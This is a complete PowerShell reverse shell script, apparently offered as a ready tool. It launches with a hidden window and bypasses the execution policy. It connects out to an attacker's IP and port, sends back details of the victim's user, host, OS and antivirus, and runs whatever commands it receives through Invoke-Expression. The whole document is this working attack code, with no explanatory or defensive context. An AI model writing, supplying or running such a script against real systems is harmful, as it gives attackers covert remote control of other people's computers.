
powershell -noprofile -noninteractive -windowstyle hidden -executionpolicy bypass -command {

$attackerIp = ""
$port = ""

try {
    $client = [System.Net.Sockets.TcpClient]::new($attackerIp, $port)
    $stream = $client.GetStream()
}
catch {
    exit
}

$whoami = whoami
$hostname = hostname  
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
$build = (Get-CimInstance Win32_OperatingSystem).BuildNumber
$av = (Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct).displayName
$banner = @"
Connected to target machine!
============================
User: $whoami 
Hostname: $hostname
OS: $os 
Arch: $arch
Build: $build
AV: $av
<END_OF_BANNER>
"@

$bannerBytes = [System.Text.Encoding]::utf8.getbytes("$banner")
$stream.write($bannerBytes, 0, $bannerBytes.Length)
$stream.Flush()

$prompt = "PS " + (Get-Location).path + "> "
$outputbytes = [System.Text.Encoding]::utf8.getbytes($prompt)
$stream.write($outputbytes, 0, $outputbytes.Length)
$stream.Flush()

$buffer = New-Object byte[] 65535

try {
    while (($bytesread = $stream.read($buffer, 0, $buffer.Length)) -ne 0) {
        $command = [System.Text.Encoding]::utf8.getstring($buffer, 0, $bytesread).Trim()
        $command = $command -replace '<END_OF_COMMAND>$', ''
        $command = $command -replace "[<>]", ''

        if ([string]::IsNullOrWhiteSpace($command)) {
            $output = ""
        }
	
	elseif ($command -match '^(cls|clear)$') {
		$output = "`n" * 50
		Clear-Host | out-string
	    }
	
    elseif ($command -match '^(exit|quit)$') {
            break
        }

    else {
        try {
               $output =  Invoke-Expression $command 2>&1 | Out-String
            }

        catch {
                $output = $_ | out-string
            }  
        }

        $prompt = "PS " + (Get-Location).path  + "> "
        $fulloutput = $output + $prompt + "<END_OF_OUTPUT>"
        $outputbytes = [System.Text.Encoding]::utf8.getbytes($fulloutput)
        $stream.Write($outputbytes, 0, $outputbytes.Length)
        $stream.Flush()
    }
}

finally {
    $client.close()
}

}
